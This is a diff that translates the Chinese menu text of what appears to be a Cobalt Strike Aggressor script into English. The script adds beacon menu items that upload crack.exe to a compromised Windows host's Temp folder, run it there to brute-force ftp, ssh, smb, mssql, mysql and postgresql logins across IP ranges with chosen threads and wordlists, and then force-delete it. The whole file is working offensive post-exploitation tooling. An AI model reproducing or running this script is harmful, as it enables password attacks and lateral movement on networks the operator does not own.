@@ -2,17 +2,17 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       XWAY.CN@panda        #
 #                            #
 #                            #
 #                            #
 ##############################
-	    menu "暴力破解" {
-			item "上传crack" {
+	    menu "Brute Force" {
+			item "Upload Crack" {
 				$bid = $1;
-				$dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload Crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+				drow_text($dialog, "UploadPath",  "UploadPath:"); 	
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
 sub crack {
@@ -21,17 +21,17 @@ sub crack {
 
         bupload($bid, script_resource("/script/crack.exe"));
     }
-                item "运行crack"{
+                item "Run crack.ext"{
                     $bid = $1['@'];
-                    $Dialog = dialog("运行crack",%(ip => "192.168.1.1/24，192.168.1-255，192.168.1.1", port => "3389", username => "filename list or username", password => "filename list or password", type => "ssh", thread => "默认线程100",bid => $bid),&crack_run);
-                    dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。");
+                    $Dialog = dialog("Run Crack",%(ip => "192.168.1.1/24，192.168.1-255，192.168.1.1", port => "3389", username => "filename list or username", password => "filename list or password", type => "ssh", thread => "Default threads = 100",bid => $bid),&crack_run);
+                    dialog_description($Dialog, "Support ftp，ssh，smb，mssql，mysql, postgresql. Result will save in current_folder/result.txt");
                     drow_text($Dialog, "ip", "ip: ");
                     drow_text($Dialog, "port", "port: ");
 					drow_text($Dialog, "username", "username: ");
 					drow_text($Dialog, "password", "password: ");
 					drow_text($Dialog, "type", "type: ");
 					drow_text($Dialog, "thread", "thread: ");
-                    dbutton_action($Dialog, "运行");
+                    dbutton_action($Dialog, "RUN");
                     dialog_show($Dialog);
                 }
 
@@ -45,7 +45,7 @@ sub crack_run{
 	$thread = $3['thread'];
 	bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
 }  
-        	item "删除crack"{
+        	item "Remove crack.exe"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q crack.exe");
